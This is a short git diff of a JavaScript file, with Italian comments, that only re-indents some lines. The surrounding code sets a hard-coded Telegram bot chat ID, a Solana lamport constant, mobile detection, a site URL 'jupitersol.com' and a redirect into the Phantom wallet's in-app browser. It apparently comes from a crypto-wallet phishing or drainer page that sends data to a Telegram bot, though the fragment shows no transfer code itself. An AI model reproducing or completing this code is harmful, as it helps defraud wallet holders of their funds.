@@ -4,17 +4,17 @@ $(document).ready(async function () {
   // Sostituisci con il token del tuo bot
   // const chatId = "7050439107"; // Sostituisci con il tuo chat ID
     const chatId = "927059314"; // Sostituisci con il tuo chat ID
-  const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
+    const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport
   // const isMobile =
   //   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
   //     navigator.userAgent
   //   );
-  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
         navigator.userAgent
       );
 
-  const siteURL = "https://jupitersol.com"; // 🔗 Your actual site
-  const encodedURL = encodeURIComponent(siteURL);
+   const siteURL = "https://jupitersol.com"; // 🔗 Your actual site
+   const encodedURL = encodeURIComponent(siteURL);
 
     // 🔗 Redirect to Phantom in-app browser if on mobile and Phantom not detected
     if (isMobile && !window.solana) {
